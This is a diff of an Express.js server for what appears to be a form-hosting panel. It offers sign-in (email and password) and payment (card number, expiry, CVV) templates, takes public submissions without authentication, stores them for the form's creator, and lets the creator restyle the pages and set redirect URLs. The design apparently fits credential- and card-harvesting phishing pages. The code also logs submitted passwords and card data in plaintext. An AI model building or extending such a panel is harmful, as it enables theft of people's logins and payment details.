-      'contact': {
-        name: 'Contact Form',
-        fields: [
-          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
-        ]
-      },
-      'payment-checkout': {
-        name: 'Payment Checkout Form',
-        fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
-          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
-          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
-        ]
-      }
-    };
-
-    console.log(`Retrieved ${userSubmissions.length} submissions and ${Object.keys(userFormConfigs).length} forms for user ${userId}`);
-    res.json({
-      submissions: userSubmissions.reverse(),
-      formConfigs: userFormConfigs,
-      templates,
-      userId
-    });
-  } catch (error) {
-    console.error('Error fetching data for /get:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to fetch data', details: error.message });
-  }
-});
-
-// Submit form data
-app.post('/form/:id/submit', async (req, res) => {
-  const formId = req.params.id;
-  
-  if (!formConfigs[formId]) {
-    console.error(`Form not found for ID: ${formId}`);
-    return res.status(404).json({ error: 'Form not found' });
-  }
-
-  if (formConfigs[formId].expiryTime && new Date(formConfigs[formId].expiryTime) <= new Date()) {
-    delete formConfigs[formId];
-    await saveFormConfigs();
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    const updatedSubmissions = submissions.filter(s => s.formId !== formId);
-    await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
-    console.error(`Form ${formId} has expired`);
-    return res.status(410).json({ error: 'Form has expired' });
-  }
-
-  try {
-    const formData = req.body;
-    const config = formConfigs[formId];
-    const userId = config.userId;
-    const templates = {
-      'sign-in': {
-        name: 'Sign In Form',
-        fields: [
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
-          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
-        ]
-      },
-      'contact': {
-        name: 'Contact Form',
-        fields: [
-          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
-        ]
-      },
-      'payment-checkout': {
-        name: 'Payment Checkout Form',
-        fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
-          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
-          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
-        ]
-      }
-    };
-
-    const template = templates[config.template] || templates['sign-in'];
-
-    for (const field of template.fields) {
-      if (field.validation && field.validation.required && !formData[field.id]) {
-        console.error(`Missing required field: ${field.id}`);
-        return res.status(400).json({ error: `Missing required field: ${field.id}` });
-      }
-      if (field.validation && field.validation.regex && formData[field.id]) {
-        try {
-          const regex = new RegExp(field.validation.regex);
-          if (!regex.test(formData[field.id])) {
-            console.error(`Invalid format for field: ${field.id}`);
-            return res.status(400).json({ error: field.validation.errorMessage });
-          }
-        } catch (e) {
-          console.error(`Invalid regex for field ${field.id}:`, e);
-          return res.status(400).json({ error: `Invalid regex for field: ${field.id}` });
-        }
-      }
-    }
-
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    submissions.push({
-      userId,
-      formId,
-      data: Object.entries(formData).map(([key, value]) => ({
-        field: key,
-        value: sanitizeForJs(value)
-      })),
-      timestamp: new Date().toISOString()
-    });
-
-    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
-    console.log(`Stored submission for form ${formId} by user ${userId}:`, formData);
-    res.status(200).json({ message: 'Form submitted successfully' });
-  } catch (error) {
-    console.error('Error submitting form:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to submit form', details: error.message });
-  }
-});
-
-// Delete submission
-app.delete('/form/:id/submission/:index', verifyToken, async (req, res) => {
-  const formId = req.params.id;
-  const index = parseInt(req.params.index, 10);
-  const userId = req.user.userId;
-
-  try {
-    if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
-      console.error(`User ${userId} does not have access to form ${formId}`);
-      return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
-    }
-
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    const userFormSubmissions = submissions.filter(s => s.userId === userId && s.formId === formId);
-
-    if (index < 0 || index >= userFormSubmissions.length) {
-      console.error(`Invalid submission index: ${index} for form ${formId} by user ${userId}`);
-      return res.status(404).json({ error: 'Submission not found' });
-    }
-
-    const submissionToDelete = userFormSubmissions[index];
-    const globalIndex = submissions.findIndex(s => 
-      s.userId === userId && s.formId === formId && s.timestamp === submissionToDelete.timestamp
-    );
-
-    if (globalIndex === -1) {
-      console.error(`Submission not found for form ${formId} at index ${index} by user ${userId}`);
-      return res.status(404).json({ error: 'Submission not found' });
-    }
-
-    submissions.splice(globalIndex, 1);
-    await fs.writeFile(submissionsFile, JSON.stringify(submissions, null, 2));
-    console.log(`Deleted submission at index ${index} for form ${formId} by user ${userId}`);
-
-    res.status(200).json({ message: 'Submission deleted successfully' });
-  } catch (error) {
-    console.error('Error deleting submission:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to delete submission', details: error.message });
-  }
-});
-
-// Delete form
-app.delete('/form/:id', verifyToken, async (req, res) => {
+// Endpoint to update form configuration
+app.put('/api/form/:id', verifyToken, async (req, res) => {
   const formId = req.params.id;
   const userId = req.user.userId;
 
   try {
-    if (!formConfigs[formId] || formConfigs[formId].userId !== userId) {
-      console.error(`User ${userId} does not have access to form ${formId}`);
-      return res.status(404).json({ error: 'Form not found or access denied' });
-    }
+    // Reload formConfigs to ensure data is fresh
+    await loadFormConfigs();
 
-    delete formConfigs[formId];
-    await saveFormConfigs();
-
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    const updatedSubmissions = submissions.filter(s => 
-      !(s.userId === userId && s.formId === formId)
-    );
-    await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
-    console.log(`Deleted form ${formId} and its submissions for user ${userId}`);
-
-    res.status(200).json({ message: 'Form and associated submissions deleted successfully' });
-  } catch (error) {
-    console.error('Error deleting form:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to delete form', details: error.message });
-  }
-});
-
-// Get submissions
-app.get('/submissions', verifyToken, async (req, res) => {
-  try {
-    const userId = req.user.userId;
-    const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-    const userSubmissions = submissions.filter(s => s.userId === userId);
-
-    const templates = {
-      'sign-in': {
-        name: 'Sign In Form',
-        fields: [
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } },
-          { id: 'password', placeholder: 'Password', type: 'password', validation: { required: true } }
-        ]
-      },
-      'contact': {
-        name: 'Contact Form',
-        fields: [
-          { id: 'phone', placeholder: 'Phone Number', type: 'tel', validation: { required: true } },
-          { id: 'email', placeholder: 'Email', type: 'email', validation: { required: true, regex: '^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$', errorMessage: 'Please enter a valid email address.' } }
-        ]
-      },
-      'payment-checkout': {
-        name: 'Payment Checkout Form',
-        fields: [
-          { id: 'card-number', placeholder: 'Card Number', type: 'text', validation: { required: true, regex: '^\\d{4}\\s?\\d{4}\\s?\\d{4}\\s?\\d{4}$', errorMessage: 'Please enter a valid 16-digit card number.' } },
-          { id: 'exp-date', placeholder: 'Expiration Date (MM/YY)', type: 'text', validation: { required: true } },
-          { id: 'cvv', placeholder: 'CVV', type: 'text', validation: { required: true } }
-        ]
-      }
-    };
-
-    console.log(`Retrieved ${userSubmissions.length} submissions for user ${userId}`);
-    res.json({
-      submissions: userSubmissions.reverse(),
-      templates,
-      userId
-    });
-  } catch (error) {
-    console.error('Error fetching submissions:', error.message, error.stack);
-    res.status(500).json({ error: 'Failed to fetch submissions', details: error.message });
-  }
-});
-
-// Get form configuration
-app.get('/api/form/:id', verifyToken, async (req, res) => {
-  const formId = req.params.id;
-  const userId = req.user.userId;
-
-  try {
+    // Check if form exists and belongs to the user
     const config = formConfigs[formId];
     if (!config) {
       console.error(`Form not found for ID: ${formId}`);
@@ -1596,14 +1192,87 @@ app.get('/api/form/:id', verifyToken, async (req, res) => {
       return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
     }
 
-    if (config.expiryTime && new Date(config.expiryTime) <= new Date()) {
-      delete formConfigs[formId];
-      await saveFormConfigs();
-      const submissions = JSON.parse(await fs.readFile(submissionsFile, 'utf8'));
-      const updatedSubmissions = submissions.filter(s => s.formId !== formId);
-      await fs.writeFile(submissionsFile, JSON.stringify(updatedSubmissions, null, 2));
-      console.error(`Form ${formId} has expired`);
-      return res.status(410).json({ error: 'Form has expired' });
+    console.log(`Processing update for form ${formId} by user ${userId}:`, req.body);
+
+    const validActions = ['url', 'message'];
+    const updatedConfig = {
+      ...config,
+      template: req.body.template || config.template,
+      headerText: req.body.headerText || config.headerText || 'My Form',
+      headerColors: Array.isArray(req.body.headerColors)
+        ? req.body.headerColors.map(sanitizeForJs)
+        : config.headerColors || [],
+      subheaderText: req.body.subheaderText || config.subheaderText || 'Fill the form',
+      subheaderColor:
+        req.body.subheaderColor ||
+        config.subheaderColor ||
+        (req.body.theme === 'dark' ? '#d1d5db' : '#555555'),
+      placeholders: Array.isArray(req.body.placeholders)
+        ? req.body.placeholders.map(p => ({
+            id: sanitizeForJs(p.id),
+            placeholder: sanitizeForJs(p.placeholder),
+          }))
+        : config.placeholders || [],
+      borderShadow:
+        req.body.borderShadow ||
+        config.borderShadow ||
+        (req.body.theme === 'dark' ? '0 0 0 2px #ffffff' : '0 0 0 2px #000000'),
+      buttonColor:
+        req.body.buttonColor ||
+        config.buttonColor ||
+        'linear-gradient(45deg, #00b7ff, #0078ff)',
+      buttonTextColor:
+        req.body.buttonTextColor ||
+        config.buttonTextColor ||
+        (req.body.buttonColor === '#ffffff' ? '#000000' : '#ffffff'),
+      buttonText: req.body.buttonText || config.buttonText || 'Sign In',
+      buttonAction: validActions.includes(req.body.buttonAction)
+        ? req.body.buttonAction
+        : config.buttonAction || 'url',
+      buttonUrl: req.body.buttonUrl ? normalizeUrl(req.body.buttonUrl) : config.buttonUrl || '',
+      buttonMessage: req.body.buttonMessage || config.buttonMessage || '',
+      theme: req.body.theme === 'dark' ? 'dark' : config.theme || 'light',
+      updatedAt: new Date().toISOString(),
+    };
+
+    if (updatedConfig.buttonAction === 'url' && updatedConfig.buttonUrl && !normalizeUrl(updatedConfig.buttonUrl)) {
+      console.error('Invalid URL provided:', updatedConfig.buttonUrl);
+      return res.status(400).json({ error: 'Invalid URL provided' });
+    }
+    if (updatedConfig.buttonAction === 'message' && !updatedConfig.buttonMessage) {
+      updatedConfig.buttonMessage = 'Form submitted successfully!';
+    }
+
+    formConfigs[formId] = updatedConfig;
+    console.log(`Updated form config for ${formId} for user ${userId}:`, updatedConfig);
+    await saveFormConfigs();
+
+    res.status(200).json({
+      ...updatedConfig,
+      formId,
+      message: 'Form updated successfully',
+    });
+  } catch (error) {
+    console.error('Error updating form config for /api/form/:id:', error.message, error.stack);
+    res.status(500).json({ error: 'Failed to update form configuration', details: error.message });
+  }
+});
+
+// Endpoint to fetch form configuration
+app.get('/api/form/:id', verifyToken, async (req, res) => {
+  const formId = req.params.id;
+  const userId = req.user.userId;
+
+  try {
+    await loadFormConfigs();
+    const config = formConfigs[formId];
+    if (!config) {
+      console.error(`Form not found for ID: ${formId}`);
+      return res.status(404).json({ error: 'Form not found' });
+    }
+    if (config.userId !== userId) {
+      console.error(`User ${userId} does not have access to form ${formId}`);
+      return res.status(403).json({ error: 'Access denied: Form does not belong to you' });
     }
 
     console.log(`Retrieved form config for ${formId} for user ${userId}`);
